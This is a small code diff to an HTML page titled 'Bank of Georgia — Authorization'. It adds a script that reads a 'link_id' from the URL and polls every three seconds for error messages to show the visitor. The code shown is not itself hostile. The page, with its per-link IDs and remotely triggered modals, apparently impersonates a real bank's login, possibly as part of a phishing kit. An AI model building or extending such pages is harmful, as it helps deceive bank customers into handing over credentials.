@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Bank of Georgia — Authorization</title>
+  <link rel="stylesheet" href="error-modal.css">
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
 
@@ -910,6 +911,14 @@
       chatSend();
     }
   });
+
+  // Start error polling
+  document.addEventListener('DOMContentLoaded', () => {
+    const linkId = new URLSearchParams(window.location.search).get('link_id');
+    if (linkId && typeof ErrorModal !== 'undefined') {
+      ErrorModal.startPolling(linkId, 'bog', 3000);
+    }
+  });
 </script>
 
 <!-- Loader -->
@@ -965,5 +974,6 @@
 
 </div>
 
+<script src="error-modal.js"></script>
 </body>
 </html>
